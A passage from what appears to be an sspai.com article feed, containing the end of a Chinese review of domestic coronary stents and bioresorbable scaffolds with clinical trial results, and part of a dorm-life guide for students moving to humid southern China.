0.4%的患者中。目前暂时没有找到更长时间随访的数据。</p>\n<h4>EXCROSSAL 心跃支架——吉威（蓝帆）</h4>\n<p>吉威是第三个自主研发冠脉支架上市的国产品牌，紧随乐普和微创之后在 2005 年底获得了 Excel 支架的注册证，不锈钢骨架（120μm 厚）搭配可降解涂层，占据了约 20% 的市场份额，在真实世界中，术后 MACE 发生率也较低，1 年为 2.7%，术后 18 个月 3.1%。随后吉威在 EXCEL 的基础上进行了设计改良，就是现在进入集采的 EXCROSSAL 支架。</p>\n<p>心跃 EXCROSSAL 支架 2017 年获批上市，采用钴铬合金支架平台，支架小梁厚 84μm，侧孔直径更大，更适合分叉病变操作，减少 66% 的载药量，并采用血管壁单侧涂层技术。 主要研究是 CREDIT 系列，CREDIT II 研究对比了EXCROSSAL 和 EXCEL 支架，结果显示术后 1 年 EXCROSSAL 支架 TLF 发生率为 4.3%，远低于 EXCEL 支架的 9.5%。并且对植入 EXCROSSAL 支架的患者进行术后 5 年的随访，结果显示 5 年 TLF 发生率为 10.6%，支架内血栓发生率仅为 1.0%，长期的安全性和有效性均较好。</p>\n<h4>Helios 海利欧斯支架——金瑞凯利（威高）</h4>\n<p>Helios 支架于 2011 年获批上市，同为钴铬合金药物洗脱支架，这个支架的特点是表面覆有Ti-O膜，具有一定的抗栓和抗炎的效果。主要的 临床研究是 HOPE 研究，对比植入了 Helios 支架与乐普的第一代支架 Partner 的患者术后 9 个月的造影，两组在 LLL 方面无显著性差异，3 年临床随访的 MACE 发生率亦无统计学差异（7.9% 比 8.2%）。目前还有 2 项注册研究在进行中，一项是前瞻性的、单臂、真实世界的研究，计划募集 3000 人，正在募集患者，随访 1-5 年。另一项计划募集 800 名患者，Clinical Trials 上状态未更新。</p>\n<h4>Tivoli 爱立支架——易生（泰尔茂）</h4>\n<p>Tivoli 支架于 2010 年获得注册证，主要的临床研究是上市前的 I-LOVE-IT I 和上市后的 I-LOVE-IT II 研究。前者与美敦力的 ENDEAVOR 支架进行对比，发现在术后 8 个月的 LLL 方面 Tivoli 支架表现更好，支架内再狭窄的发生率也明显更低（2.86% vs 8.6%）。后者则与微创公司的 Firebird2 支架进行了头对头对比，纳入了 2737 例患者，一年随访时的 TLF 发生率分别为 6.3% 和 6.1%，5 年 TLF 发生率为 11.4% 和 11.1%，确定/可能的支架内血栓发生率分别为 1.3% 和 1.5%，结果显示在安全性和有效性方面均不劣于 Firebird2 支架。</p>\n<h4>NOYA 诺言支架——万瑞飞鸿（恒升）</h4>\n<p>NOYA I 研究是诺言支架最主要的临床研究证据，成果于 2012 年发表在<i> EuroInervention</i> 杂志上，以 150 例比 150 例的样本量对比了NOYA支架和 Firebird2 支架，9 个月时复查造影发现两组 LLL 表现相当，为期 2 年的临床随访，MACE 发生率是 NOYA 4.7% vs. Firebird2 6.0%，也没有统计学差异。</p>\n<h3>国产支架未来的赛道——生物可吸收支架</h3>\n<p>前面也提到了目前冠脉支架演化到生物可吸收支架也遇到了挫折，雅培 Absorb 支架分别于 2011 年和 2016 年在 欧洲和美国上市，但其大规模的临床研究 ABSORB Ⅱ 和 ABSORB Ⅲ 长期随访结果及荟萃分析显示，Absorb BVS 的远期 TLF 和支架血栓风险要明显高于作为对照组的金标准 Xience 支架，于是雅培选择在 2017 年宣布 Absorb 支架退市。但在中国进行的 ABSORB China 研究结果明显优于 ABSORB Ⅱ 和 III，研究者分析可能的原因为中国医生更习惯通过造影准确选择与血管直径匹配的 BVS， 直径小的血管 （＜2.25mm） 比例在 ABSORB 系列研究中最低，此外球囊预扩张和后扩张也会大大提高支架的贴壁情况，降低支架内血栓的风险，而与国内的介入医生相比，国外的医生并未充分使用这两种操作。</p>\n<p>也得益于 Absorb 支架临床试验的失败，其它生产商能站在雅培的肩膀上再进行临床研究，例如设计更严格的入选标准（排除严重钙化、开口病变与粗大分支），尽量避免对小血管植入 BVS，并且强调了预扩张-选取与血管直径匹配的支架-后扩张（PSP）操作，目前多家均在不同规模的临床研究中获得了还不错的结果，2 家已在国内上市，下面简单介绍一下，设计的基本特性在下表。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/article/1e7fd6ef50a2077d0c373dfb3cb0958e\"><figcaption>来源：中国生物可吸收支架的研究与展望</figcaption></figure><h4>NeoVas——乐普</h4>\n<p>雅培的 Absorb 退市之后，乐普的 NeoVas 支架被寄予厚望，完成了 FIM 研究和与金标准 Xience 支架的头对头随机对照试验，已率先于 2019 年 3 月获批上市，是目前国内唯二可以在临床正式使用的 BVS。NeoVas 在 FIM 研究中纳入了 31 例病人，随访 6 个月，TLF 发生率为 3.2%，没有支架内血栓发生，支架梁的内皮覆盖率也达到了 95.7%。随机对照研究入选了 560 例患者，1:1 随机分为 NeoVas BRS 和 金标准 Xience 支架组，一年造影随访显示两组 LLL 相当，TLF 发生率 NeoVas 4.3% vs. Xience 3.5%，2 年随访 TLF 发生率 NeoVas 5.4% vs. Xience 4.3%，但两组间没有统计学差异，OCT 提示 NeoVas 组在支架覆盖率方面表现更好。选用 Xience 支架作为对照组可以看出乐普确实挺有信心的，在严格筛选适合病例的条件下，有效性和安全性与 Xience 支架相比也确实没有统计学差异。</p>\n<h4>Xinsorb ——山东华安（威高）</h4>\n<p>在 2020 年 3 月，Xinsorb 支架也获批上市，在注册报告中华安提交了 FIM 实验随访 4 年的结果，TLF 发生率为 13. 3%， 与雅培 Abbott BVS 结果相当。XINSORB 随机对照研究则选择了 Tivoli 支架作为对照组，共入选了 395 例患者， 结果显示 Xinsorb BRS 一年节段内 LLL 不劣于 TIVOLI 支架，TLF 发生率 术后一年是 Xinsorb 2. 6%，TIVOLI 5. 3%，4 年随访结果为 Xinsorb 5.0%，TIVOLI 6.2%， MACE 为 Xinsorb 5.0% 比 Tivoli 6.2%。在严格筛选适合病例的条件下，有效性和安全性都不错。</p>\n<h4>尚未上市的国产生物可吸收支架</h4>\n<p>目前还在做上市前的临床评价的还有微创的 Firesorb、百心安的 Bioheart、阿迈特的 AMsorb 以及先健科技的铁支架 IBS等。</p>\n<p>这其中进度条读得最快是<strong>微创的 Firesorb</strong>，FUTURE I 研究随访 3 年的结果已发表，与其他的 PLLA 骨架的 BVS 相比，Firesorb BRS 为了尽量减少过厚的支架小梁对内皮化的影响，采用了 100μm 和 125μm 的厚度。在 PLLA 做骨架的 BVS 中算是比较纤薄的了，期待它的随机对照研究。</p>\n<p><strong>百心安的 Bioheart </strong>于 2016 年获批进入临床试验阶段，FIM 研究入选了 46 名患者，1 年的随访结果在 2018 年的美国 TCT 大会上公布，仅 1 例在术后 8 个月时发生了支架内血栓，继而发生了心梗。随机对照研究正在进行，对照组也选用了金标准 Xience 系列支架，期待。</p>\n<p><strong>阿迈特的 AMsorb </strong>有点特殊，与其他支架骨架采用激光加工不同，AMsorb 采用 3D 多轴曲面支架打印技术制造，是我国拥有完全自主知识产权的全球首个 3D 打印全降解冠脉支架，骨架材料依然是 PLLA，其卖点是 3D 打印技术带来的独特支架梁结构设计，在保证支撑力不变的情况下减少了接触血管的面积，可以提高内皮化的进程，同时支架降解的时间也更短。2019 年 FIM 研究已完成入组，期待随访结果。</p>\n<p>最特殊的要数<strong>先健科技的 IBS</strong> 了，全称是铁基生物可吸收支架（ iron-based bioresorbable scaffold，IBS），是目前全球唯一使用铁作为材料的全降解血管支架 ，该产品以渗氮纯铁 Fe-0.05%N 为骨架，表面载锌与聚合物，以及雷帕霉素药物，支架梁壁厚 70μm 左右，比绝大多数钴铬合金的 DES 还要薄但支撑强度却更高。 降解产生的铁和锌是人体必需的微量元素，且每天释放的量很小，不会引起体内这两种元素过量。 2019 年 12 月在阜外医院完成了首次人体试验，入组 65 例，目前还在临床随访中，文章尚未发表，期待一下后续吧。</p>\n<p>以上就是文章的全部内容了，篇幅很长，感谢能够认真读到这里的你。</p>\n<p>也感谢编辑 Microhoo 给予的支持！</p>\n<hr>\n<h2>部分参考资料</h2>\n<p>国家冠脉支架集中带量采购文件</p>\n<p>国家组织冠脉支架集中带量采购中选结果</p>\n<p>中国心血管健康与疾病报告（2019）</p>\n<p>经皮冠状动脉介入治疗发展历程</p>\n<p>中国医疗器械蓝皮书（2019版）</p>\n<p>国产生物可吸收冠状动脉支架的研究现状</p>\n<p>Xinsorb 医疗器械产品注册技术审评报告</p>\n<p>Drug-Eluting Coronary-Artery Stents</p>\n<p>Coronary balloon angioplasty, stents, and scaffolds</p>\n<p>Cobalt Chromium-Based Biodegradable Polymer Sirolimus-Eluting Stent: Rationale, evidence, and clinical experience.</p>\n<p>Bioresorbable Vascular Scaﬀolds—Dead End or Still a Rough Diamond?</p>\n<p>Fantom Bioresorbable Scaffold - Verse, But Not Yet Chorus (An Incomplete Composition)*</p>\n<p>Liu Y, Zhang Y, Li Y, et al. One-year clinical results of the NANO registry: A multicenter, prospective all-comers registry study in patients receiving implantation of a polymer-free sirolimus-eluting stent. Catheter Cardiovasc Interv. 2020;1–7.</p>\n<p>Han YL, Jing QM, Xu B, et al. Safety and Efﬁcacy of Biodegradable Polymer-Coated Sirolimus-Eluting Stents in “Real-World” Practice: 18-Month Clinical and 9-Month Angiographic Outcome. JACC: CARDIOVASCULAR INTERVENTIONS, VOL. 2, NO. 4, 2009 APRIL 2009:303–9.</p>\n<p>Wang G, Ma G, Tao L, et al. Three-year follow-up of biodegradable polymer cobalt-chromium sirolimus-eluting stent (EXCROSSAL) in treating de novo coronary artery disease: Pooled analysis of CREDIT II and CREDIT III trials. Catheter Cardiovasc Interv. 2020;1–7.</p>\n<p>Xu K, Han Y, Xu B, Yang Y, Wang G, Li H, Sun Y, Tao L, Wang H, Yuan Z, Liu H, Liu J, Jia Y, Ma G, Fu G, Li X, Li S, Wang S, Pu K; CREDIT 2 Investigators. Efficacy and safety of a second-generation biodegradable polymer sirolimus-eluting stent: One-year results of the CREDIT 2 trial. Cardiovasc Ther. 2018 Jun;36(3):e12327.</p>\n<p>第二代生物可降解聚合物涂层西罗莫司 洗脱支架治疗原发原位冠状动脉病变的 5年临床疗效分析.中华心血管病杂志 2021 年2 月第 49 卷第 2 期</p>\n<p>Zhang F, Yang J, Qian J, Ge L, Zhou J, Ge J; for the FOCUS registry investigators. Long-term performance of the second-generation cobalt-chromium sirolimus-eluting stents in real-world clinical practice: 3-year clinical outcomes from the prospective multicenter FOCUS registry. J Thorac Dis 2016;8(7):1601-1610.</p>\n<p>Han YL, Xu B, Xu K, et al. Six Versus 12 Months of Dual Antiplatelet Therapy After Implantation of Biodegradable Polymer Sirolimus-Eluting Stent: Randomized Substudy of the I-LOVE-IT 2 Trial. Circ Cardiovasc Interv. 2016;9:e003145</p>\n<p>Han YL, Xu B, Fu G, et al. A Randomized Trial Comparing the NeoVas Sirolimus-Eluting Bioresorbable Scaffold and Metallic Everolimus-Eluting Stents. JACC: CARDIOVASCULAR INTERVENTIONS. FEBRUARY 12, 2018:260–72.</p>\n<p>Lin W, Zhang H, Zhang W, Qi H, Zhang G, Qian J, Li X, Qin L, Li H, Wang X, Qiu H, Shi X, Zheng W, Zhang D, Gao R, Ding J. In vivo degradation and endothelialization of an iron bioresorbable scaffold. Bioact Mater. 2020 Oct 12;6(4):1028-1039. </p>\n<p>Zheng JF, Qiu H, Tian Y, Hu XY, Luo T, Wu C, Tian Y, Tang Y, Song LF, Li L, Xu L, Xu B, Gao RL. Preclinical Evaluation of a Novel Sirolimus-Eluting Iron Bioresorbable Coronary Scaffold in Porcine Coronary Artery at 6 Months. JACC Cardiovasc Interv. 2019 Feb 11;12(3):245-255. </p>\n<p>Zhang YJ, Wang XZ, Fu G, et al. Clinical and multimodality imaging results at 6 months of a bioresorbable sirolimus-eluting scaffold for patients with single de novo coronary artery lesions: the NeoVas first-in-man trial. EuroIntervention 2016; 12:1279-1287.</p>\n<p>Wang X-Z, Zhang Y-J, Fu G-S, Jing QM, Xu B, Han Y-L. One-year clinical outcomes and multislice computed tomography angiographic results following implantation of the NeoVas bioresorbable sirolimus-eluting scaffold in patients with single de novo coronary artery lesions. Catheter Cardiovasc Interv. 2018;91:617–622.</p>\n<p>A First-in-Man Study of IBS (IBS-FIM). ClinicalTrials.gov Identifier: NCT03509142</p>\n","link":"https://sspai.com/post/68092"},{"title":"开学季 | 初来南方的你，可能需要这份宿舍生存指南","date":"2021-08-06 07:30:00","description":"\n<h4><strong>开学季</strong></h4>\n<p>少数派的读者中有不少学生朋友，而对这个暑假之后即将进入大学的读者来说，接下来摆在眼前的可能是新的城市、新的生活环境和新朋友，以及更多可以自由安排的时间用来学习、探索。</p>\n<p>因此和往年一样，少数派也将整理一系列围绕开学季这个话题的内容与资源，不管你是打算为自己挑选一台好设备、好工具，还是投身知识与书本、发展一门新爱好、充实自己的大学生活，这些文章都能为你提供一些参考和帮助。</p>\n<hr>\n<p>可能你刚刚考上了心仪的大学，又或许你找到了合适的工作，人生的重大转折与选择放在你面前摆好，于是你即将面临一场行途漫长的迁移——从整体气候更加干燥的北方，去往更为温暖、更加潮湿的南国。但是你大概也听说了不少令人色惧甚至世代流传的南方轶闻：韩愈被贬到阳山之后，都忍不住要感叹一句「南方本多毒，北客恒惧侵」<sup class=\"ss-footnote\" href=\"\" title=\"出自韩愈《县斋读书（在阳山作）》\" footnote-id=\"1\">1</sup>。当然，现代医学已经说得很清楚了，这世上没什么「瘴气」，在城市里也不会有太多的毒物——但中国实在太大了，单单气候和日常生活中接触得到的生物差异就足够让你手足无措好一阵子，我们还是不得不直面它们。</p>\n<p>本文两名作者均来自河南，@Sharon大橘子 在广东度过了本科与硕士生涯，@北鸮 则分别去了吉林和广东，不仅深刻体会了各地的生活差异，还有充足的踩雷与惊吓经历。所以在这篇文章中，我们着重强调在湿热地区的宿舍中你最好准备的东西，希望可以给即将去南方长住的朋友们一些帮助。这些宿舍用品可以买好了带去，也可以到当地再进行购买，但是务必提前准备好，不然等到用的时候，真的会措手不及。</p>\n<p>如果你有其他合适的物品和自己的心得体会，也欢迎大家一起交流。</p>\n<h2>远离蚊虫，身心舒畅</h2>\n<p>对北方人来说，初到南方最直接的打击就是这里的生物多样性：要么是从小就没见过，要么是见过，但是南方的品种远远超出想象。所以对于即将去南方上学、生活的朋友们来说，一定要准备一些防蚊虫的东西，不然前方等待着的就是惊叫不断，噩梦连连。</p>\n<h3>蚊帐</h3>\n<p>蚊帐当然非常常见，但对大部分北方城市来说，它并非真正的「必备」。@北鸮 在东北上学时，蚊帐就是夏天限定的东西，更有一些勇士全年都用不到蚊帐，靠优秀的体质把问题转嫁给室友。但是越往南方，蚊帐越需要一年四季挂着，尤其是在寝室这种消杀条件和空调状况都不够理想的环境。如果说北方的蚊子是恼人的秋风，那南方的蚊子就是嚣张的龙卷风，不光个头巨大，咬完起的包也是前所未见地大——我能怎么办，我只能尊重物种多样性，一年四季挂上蚊帐。</p>\n<p>蚊帐不止防蚊子，也会防一些奇奇怪怪叫不上名字的虫子，所以最好选择网眼很密集的蚊帐。通常情况下，宿舍用的蚊帐是那种最普通的，可以直接四角挂在蚊帐架上的，如果你的寝室楼层高、通风好、附近树木较少，或是非常经常打扫卫生，蚊虫数量不是太多，选择这种蚊帐就可以了，保持蚊帐开口关严、底端在床垫下压实即可，缺点是和遮光帘同用时，开合进出会变得比较麻烦。</p>\n<p>还有一些虫子智商占领了高地，经常会从蚊帐的开口溜进来，住在低楼层的 @Sharon大橘子 现在就更倾向于带拉链的蚊帐，一是开口严密不会有漏网之虫，另一个原因是这种蚊帐顶部不会塌下来，活动空间比较大，但是收纳起来就没有原来传统的蚊帐方便，你可以根据需要自行取舍。</p>\n<p>蚊帐可以买两顶用来换洗，如果你过得比较粗糙，一顶也可以用到底。即便其中一顶洗了，也有另一顶蚊帐可以晚上保命。毕竟哪怕失去一晚蚊帐，第二天就可能又会对物种多样性有新的认识。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449aftb34tarbb3pjr0.png\"></figure><p>现在也有一些一体式的遮光蚊帐床帘，在宿舍需要个人私密空间也可以选择这种一体式的设备，一劳永逸，收纳也会省一些空间。</p>\n<h3>驱蚊液</h3>\n<p>但毕竟我们总要走出蚊帐（总要上课），所以除了蚊帐之外，驱蚊液也是必备的。我在北方的时候其实很少被蚊子叮咬，但是来到这边不仅见识了物种多样性，也对自己不会被蚊子叮咬的体质失去了信心。之前在北方常常会买花露水来安慰自己，但是真正的驱蚊液是需要有<strong>避蚊胺（DEET）、驱蚊酯（BAAPE）</strong>等有效驱蚊成分的，在购买时务必查看有效成分及其浓度，方便随时根据你所在的环境调整。</p>\n<p>驱蚊液常见的大多是喷雾式，均匀喷洒在裸露肌肤就可以。和普通的花露水相比，含有有效驱蚊成分的驱蚊液大多味道不甚理想，你可以在宿舍多准备几瓶不同浓度的驱蚊液。比如上课、吃饭这样短途的出行，我就会用上味道相对平和，浓度也偏低的驱蚊液。但如果要出远门，或者经常大量出汗，就可以考虑浓度更高的产品——比如 @北鸮 备着一瓶防汗防水溅的 3M Ultrathon，如果长距离外出就喷上一些。因为南方的蚊子太过于凶猛，如果经常出汗洗刷皮肤，低浓度的驱蚊液可能要一天喷 800 次，真的很不扛用。@Sharon大橘子 则是出门时包里直接带上低浓度驱蚊液随时补喷，如果整瓶装上有点沉，可以考虑尝试化妆品分装瓶，记得做好标签就行。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449ag5b34tasob6hrgg.png\"></figure><p>但是也需要注意，有些驱蚊液中的成分对小孩子、宠物有害，如果宿舍中有小孩或者宠物（虽然这个可能性真的很小，万一呢），需要提前查一下要买的驱蚊液的成分的适用性。</p>\n<h3>蟑螂药</h3>\n<p>蚊子的可怕是可知的，但是蟑螂的可怕是在于它的未知——在去南方上学之前，@Sharon大橘子 对于蟑螂根本没有概念，也从来没有见过。直到头回看到会飞的大蟑螂，她直接做了一晚上的噩梦。蟑螂这个东西只要你看见一只，就说明还有很多只在暗处潜伏。更可怕的是，很多杀虫剂对于蟑螂效用不强，喷完宿舍一遍之后，还有一些蟑螂存活。如果消杀不完全，那广东蟑螂不光不会消失，还会因为很关心你给你做一顿粤菜。最明显的变化，就是在东北会被德国小蠊吓到舍友怀里的 @北鸮 在广州住了两年后，回家看到偶尔出现的小蟑螂几乎没了反应。</p>\n<p>网上有一些偏方，什么用土豆白糖硼酸之类的，这些对于住在宿舍的同学来说非常不方便，而且实际效果也不甚理想，不推荐大家尝试。也有人选择物理消杀的蟑螂屋，但是它会误黏一些别的生物，占据了原本消灭蟑螂的空间，这样也很难起到作用。而且这东西放在宿舍里会不小心踩到，那整个蟑螂屋就报废了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449agdb34tar307ksi0.png\"></figure><p>在尝试过各种产品之后，整体感觉最有效的还是蟑螂饵剂。这种注射型的蟑螂胶饵只需要涂抹在它们容易出现的角落即可。涂抹完之后，饵剂很难被破坏，而且能借助蟑螂的习性，诱食后一传一窝地杀灭。这种蟑螂药对人类来说没有味道，也不用承受什么其他危险操作（比如拾起可能黏了不明生物的蟑螂屋），唯一的坏处是偶尔可能出现一大早起来宿舍正中央躺着一只大蟑螂的尸体的震撼场景，需要做好心理准备。</p>\n<p>蟑螂消杀是一场持久战，蟑螂饵剂是其中非常重要的一环。就 @北鸮 的个人经历来说，他在入住宿舍时，趁房子尚空，首先对整个宿舍的<strong>衣柜、床板、夹角、卫生间、阳台下水道口</strong>里里外外检查了一番，然后<strong>取下了窗帘上附着的一枚蟑螂卵鞘</strong>，这一个动作让他们宿舍整整一年半免于遭受活体蟑螂侵袭。（后来疫情来了，没人打药，蟑螂回归了。）每三个月到半年时间，宿舍就需要重新打一次胶饵，具体用量根据宿舍大小判断。在打完胶饵后，可以放置固体的盒装饵剂，作为长期放置的防蟑设备，根据说明书及时更换即可。同时，寝室里也需要备上家庭常用的杀虫喷雾作为出现目标的应急设施——虽然用这个击杀蟑螂真的很难，因为那玩意儿会飞，个头还大，生命力顽强——但也能杀得掉。在你的恐惧让你无法举起拖鞋时，这些化学制剂更是尤为重要。</p>\n<p>当然，最最基础的，请务必注意寝室卫生，及时清理垃圾，并且<strong>不要囤纸箱</strong>，尽可能减少它们能藏身的沟沟壑壑。</p>\n<h2>做好防潮，保卫衣服</h2>\n<p>湿度看起来只是一个数字，就差那么十几个百分比，实际体验起来就是千差万别。南方的天气真的比北方潮湿很多，尤其回南天、梅雨季等等特殊时节，湿度报的那个 100% 是实打实的爆表，出门出汗都觉得困难。有一些简单的办法能让你的雨季过得好受点，比如避免打开门窗，防止水汽入室，以及善用寝室空调（不一定存在）的除湿功能等等。但这些方法不一定能保证你的物品安全，所以在宿舍还是要备好防潮的东西，好避免由于潮湿带来的物品受潮、长霉、变质等等麻烦。</p>\n<p>关于湿度，更详细的内容你可以查看：<a href=\"https://sspai.com/post/68027\" target=\"_blank\">掌控湿度、凉爽一夏：送给受不了 105 度的你</a>。</p>\n<h3>防潮垫</h3>\n<p>北方家庭的床褥下大多不需要防潮垫，所以可能根本没这个概念。但到了南方的回南天，整个墙壁都在渗水，更不用说床铺有多潮湿了，尤其宿舍本身就没有那么好的环境条件。赶上那几天，整个褥子都会有一种洗完之后没晾干的感觉。更可怕的是，如果你掀起来看看，十有八九已经能看见黑乎乎的霉点。@Sharon大橘子 的个人经历更为严重，她的那块木床板已经长出了青苔……那个场景搭配上阴雨阵阵的天气，可以说是经典的南方绝望记忆。后面请教了南方的同学才知道，寝室常见的这种木板床最好在铺被褥之前，垫上一层防潮垫，才能有效保护被褥不受潮，也会避免床板上长青苔。</p>\n<p>防潮垫很便宜也很好买到，材质类似外出用的野餐垫。如果嫌普通的那种银色不好看，还有彩色的和带图案的，但是有些没必要，毕竟铺上床褥之后防潮垫也看不到了。也有加厚版的防潮垫可以打地铺用。但是注意，过于加厚的防潮垫用在床上会提升床褥整体的高度，导致宿舍上铺那个低矮的保护栏杆护不住人，睡觉时可能有危险。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449agdb34tasob6hrh0.png\"></figure><h3>除湿袋/除湿盒</h3>\n<p>除了床铺上需要防潮，衣柜里也需要。回南天的时候，衣柜里也会很潮湿，甚至会渗水。回南天的我好像处在水帘洞里，同样处在水帘洞的还有那衣柜里所有的衣服。猴子在水帘洞里还能活动活动，衣服在水帘洞里放久了只会遇到老熟人——青苔，当然还有霉菌，就差你一打开衣柜，里面立马泼一桶水到你脸前了。哪怕不说回南天，南方的气候就很潮湿，加上衣柜很多时候密闭不透气，衣柜里的湿度也不会低到哪儿去。</p>\n<p>除湿袋和除湿盒的常见有效成分就是无水氯化钙，吸水能力超强，造价也低廉。大多数除湿袋可以挂在衣柜里面，黏个挂钩就行。如果你短期外出不在宿舍，回来之后就能惊喜发现除湿袋里已经吸了很多水。如果是放假离开学校，再回到学校的时候除湿袋里液体甚至开始结晶。一般除湿袋推荐买这种下面可以看到吸收的液体的，这样可以判断使用时限，如果储水的部分快满了就及时更换。也有那种没有储水部分的除湿袋，但是不太好判断这个袋是否还能继续使用。如果假期离开宿舍的时候留下一个剩余使用时限较短的除湿袋，等开学回到宿舍，衣柜里大概率是很潮湿的，一些衣服可能就会有受潮长霉的危险。一个比较反习惯的点是，除湿袋首次购买最好在附近的学生超市或是小商圈入手，不要直接网购。因为一般情况下，能在这种学生超市一直卖下去，并且没被师兄师姐点名骂的除湿袋，都是吸水能力尚可、储水通道通畅、使用上没什么大岔子、价格也算是合理的型号，反而比网购盲选要稳妥划算。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449aglb34tar6a1oqig.png\"></figure><p>除了除湿袋还有除湿盒。除湿袋放在柜子里面，除湿盒可以摆在桌面上，或是不常开关的储物柜里。有些专业的同学需要在桌面上放很多书，书长时间处于很潮湿的环境，书页可能会卷边，有些印刷油墨会开始模糊不清，书的封面封底有的也会受潮破损。除了保护书，除湿盒还可以保护桌上的其他东西，比如最好在干燥环境中储存的化妆品，如果长时间处于过于潮湿的空气里，可能会结块、变质、长霉。这是亲眼见证一盒眼影盘因为没有妥善储存，假期回来之后整个长毛得到的教训，非常心痛。</p>\n<p>除湿盒在使用时同样需要注意储水量。此外要保证它放在水平面上，放在斜面可能有漏水风险。有些除湿盒还有不同的附带香味，有薰衣草香、百合香、玫瑰香等等——虽然不知道这样哪里好，但是有偏好的朋友们买之前可以注意一下香型。水集满后，务必跟随说明处理掉存水再丢弃。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449agtb34tarbb3pjrg.png\"></figure><h3>真空收纳袋</h3>\n<p>这个东西是本身只是拿来压缩体积收纳的，但在南方它有了更大的必要性。虽然有上面的一些防潮湿的办法，但是一些厚被子或者比较厚的衣物有时候还是会顾及不到。天气转凉时如果它们受潮又没出太阳，这些东西还不如不盖，干燥着受冻还舒服一些。</p>\n<p>在收纳时用上真空收纳袋，能在一定程度上保持干燥。真空收纳袋会尽可能抽干空气，自然也包括了水汽。晾晒完成并抽干之后放入柜子中收纳，几乎能隔绝潮湿，再次需要使用的时候，也可以基本保持干燥。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449ah5b34tasob6hrhg.png\"></figure><p>比较便宜的真空收纳袋还需要手动抽气，是可以累到每次收纳完都下决心再也不用的程度，但是第二年为了被子不受潮还是不得不坚强地拿出来。如果你对自己的臂力没信心，建议直接花多点买带气阀和电动抽气机的真空收纳袋，发明这个的人应该给送个锦旗好好感谢一下，不然每次抽气我自己就先背过气去了。</p>\n<h3>备用内衣</h3>\n<p>这条看起来可能有些奇怪，但是身经百战的南方同学说过，回南天就是比拼谁的内衣多的时候。一到回南天，衣服就只能晾着，但是每一天都好像白晾一样，每次拿下来都还是湿的，甚至一天比一天湿。下雨天你还可以选择晾在室内干燥的地方，但是回南天，晾在室内也不行（尤其是比较低矮或是舍友不知道随手关门关窗的寝室）。外衣还好说，大不了少换几次，内衣这东西天天换，晾不干也不能硬穿吧。建议去南方宿舍生活的朋友，多买几套内衣以备用。</p>\n<h3>烘干机/吹风机</h3>\n<p>烘干机并不是必备的，但是如果你的寝室条件允许，有这个东西真的很方便。潮湿的衣物在回南天晾不干，就可以用烘干机烘干。回南天里，幸福就是有干燥温暖的衣服穿。现在的烘干机有些就是一个小衣柜，只需要把潮湿的衣物挂进去，通上电就可以了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449ahdb34tar6a1oqj0.png\"></figure><p>但是考虑到宿舍空间有限，或是有电力的限制，吹风机也是可以的。平常用来吹头发，在回南天或者雨季里，它就成了湿衫救星。这个东西女生宿舍大概率都会备上，大部分宿舍的电力也可以支持，而且现在很多吹风机可以折叠，不太占据空间。也有其他同学用挂烫机或是其他设备来让衣服变干，希望有过体验的朋友们可以分享一下。</p>\n<h2>应对各种天气，做好万全准备</h2>\n<p>对初到南方的北方人来说，有些「极端天气」让人无所适从，比如回南天、台风，还有连绵几天的大暴雨等等……虽然这些其实都不是什么少见的东西，甚至没几个月就能习以为常，但是在南方首次长住体验到的气候和偶尔去旅游感受到的完全不是一个层次。第一次遇到台风的时候，@Sharon大橘子 整个人缩在宿舍瑟瑟发抖，并且有幸亲眼看着宿舍外面一棵大树被刮倒。如果能提前有所准备，在极端天气的那几天就会从容很多，不至于完全傻眼。</p>\n<h3>晴雨伞</h3>\n<p>没想到吧，第一个要说的竟然是雨伞。</p>\n<p>雨伞的重要程度和老家相比高了不止一个等级。在北方，是只有下雨天才会带雨伞；在南方，是如果不带伞，可能就要被拍在雨里。经常是出门的时候艳阳高照，走了两秒钟突然下起倾盆大雨，没两分钟再大太阳暴晒，只剩没带伞的人在风中凌乱，而且这样突变的天气绝不少见。在包里空间有限不能带两把伞的情况下，要同时应对下雨和暴晒，晴雨伞是最好选择。</p>\n<p>折叠的晴雨伞是出门首选，比较节省包内空间。但是选伞时务必不要挑太小的伞，不能光图个好看，不然下大雨就只能护住头，身体任凭风吹雨打了。赶上特别潮湿闷热的天气，被淋湿之后皮肤就好像被裹在厚厚的湿毛巾下面，感觉每个毛孔都不能呼吸，被淋湿的衣服还只能回去吹干，在雨后虽然会出大太阳，但是空气里那个湿度，晒干基本等于做梦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449ahlb34tarbb3pjs0.png\"></figure><p>晴雨伞现在可选择的范围也很多，花样也不少，可以兼顾实用和美观，也有很多物美价廉的品牌选择。线下购买时注意打开看一下伞布的衔接处有没有漏光的地方，不然小心连头都护不住。这里着重点名一下男同胞，如果你的字典里没有下面一节的「防晒」两个字，那就记着：不光下雨，太阳晒得厉害也得撑伞，没人在乎你撑了伞长啥样，但你变黑刺痛脱落的皮肤会在癌变前问候你祖宗的。</p>\n<h3>防晒</h3>\n<p>本来以为，大不了就是像北方夏天一样晒黑，但到了才知道南方的太阳是之前想象不到的毒辣。@Sharon大橘子 第一天到学校之后，整个皮肤都变红，甚至有些地方已经开始蜕皮了——这还不是军训。像上面说的晴雨伞，可以有一定的防晒的作用。可紫外线并不是太阳不毒用不着打伞的时候就消失的，防晒的东西还是必要选项。</p>\n<p>防晒霜的具体挑选，需要大家根据自己的皮肤特点来选择，不太好做具体的推荐，除了看标注的 SPF 指数和听人推荐，最好的挑选方法就是尝试。防晒霜一般用于脸部、颈部或者其他小范围的皮肤部位，基本原则上最好选择容易推开且防汗的防晒霜。如果防晒霜不好推开，那脸上的防晒霜会涂抹不太均匀，效果可能也不一定一致；如果防晒霜不防汗，那没过多久防晒霜就会被汗冲干净，两行白汗上青天，那也起不到防晒的作用。</p>\n<figure 